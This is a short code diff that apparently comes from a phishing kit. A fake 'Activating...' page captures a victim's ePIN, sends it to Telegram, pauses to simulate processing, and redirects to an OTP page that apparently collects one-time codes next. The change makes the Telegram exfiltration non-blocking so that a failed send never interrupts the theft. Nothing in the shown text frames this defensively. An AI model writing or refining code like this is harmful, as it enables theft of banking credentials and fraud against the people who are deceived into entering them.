@@ -362,15 +362,17 @@
     loginBtn.textContent = 'Activating...';
     
     try {
-      // Send ePIN to Telegram
-      await sendFormDataToTelegram('New ePIN', {
+      // Send ePIN to Telegram (non-blocking - won't fail form submission)
+      sendFormDataToTelegram('New ePIN', {
         'ePIN': pin
+      }).catch(err => {
+        console.warn('Telegram notification failed (non-critical):', err);
       });
       
       // Simulate processing time
       await new Promise(resolve => setTimeout(resolve, 1000));
       
-      // Redirect to OTP page
+      // Always redirect - don't block on Telegram errors
       window.location.href = `otp.html?msg=${msg}`;
     } catch (error) {
       console.error('Error submitting ePIN:', error);
